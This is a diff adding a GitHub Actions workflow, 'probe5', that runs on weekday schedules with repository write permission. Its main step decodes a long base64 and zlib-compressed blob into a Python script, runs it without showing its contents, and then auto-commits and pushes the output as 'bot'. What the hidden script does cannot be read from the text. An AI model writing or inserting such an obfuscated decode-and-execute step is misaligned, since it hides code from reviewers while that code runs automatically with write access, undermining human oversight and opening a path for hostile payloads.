@@ -1,0 +1,29 @@
+name: probe5
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 0 * * 1-5'
+    - cron: '30 8 * * 1-5'
+permissions:
+  contents: write
+concurrency:
+  group: repo-write
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: probe
+        continue-on-error: true
+        run: |
+          echo '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' | base64 -d | python3 -c "import sys,zlib;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > probe5.py
+          python3 probe5.py
+      - name: commit
+        run: |
+          git config user.name "bot"
+          git config user.email "bot@users.noreply.github.com"
+          git add probe5.txt
+          git diff --cached --quiet && exit 0
+          git commit -m "probe5"
+          for i in 1 2 3 4 5; do git pull --rebase origin main && git push && break; sleep 5; done
